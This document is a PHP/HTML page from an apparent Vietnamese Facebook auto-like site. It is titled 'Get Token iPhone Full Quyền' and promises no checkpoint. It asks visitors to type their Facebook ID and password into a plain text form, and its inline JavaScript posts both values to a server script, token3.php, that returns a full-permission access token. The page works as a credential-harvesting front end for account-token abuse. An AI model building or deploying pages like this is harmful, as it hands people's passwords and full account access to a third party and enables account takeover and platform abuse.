<?php

include 'like_hethong/head.php';

?>


<!DOCTYPE html>
<html lang="vi">
<head>
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <title>Get Token - VIPFBNOW.COM</title>
    <link rel="shortcut icon" href="https://i.imgur.com/h6NWYI8.png">
    <meta property="og:image" content="http://i.imgur.com/JA3DwPC.jpg" />
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />	
 <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
</head>
<div class="container">
  <h2>Get Token iPhone Full Quyền</h2>
  <div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading">Không Bị Checkpoint 100%</div>
      <div class="panel-body">      
<div class="form-group">
  <label for="usr">ID Facebook:</label>
  <input type="text" class="form-control" id="tk">
</div>
<div class="form-group">
  <label for="pwd">Pass Facebook:</label>
  <input type="text" class="form-control" id="mk">
</div>
<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Lấy Token</button>
<p>
<li id="trave" class="list-group-item"><img src="https://i.imgur.com/4xwpZzp.png"> </li></p>

</div>
    </div>
</div>

<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "./token3.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>

</body>
</html>
</div></div></div>
<?php
include 'like_hethong/foot.php';
?>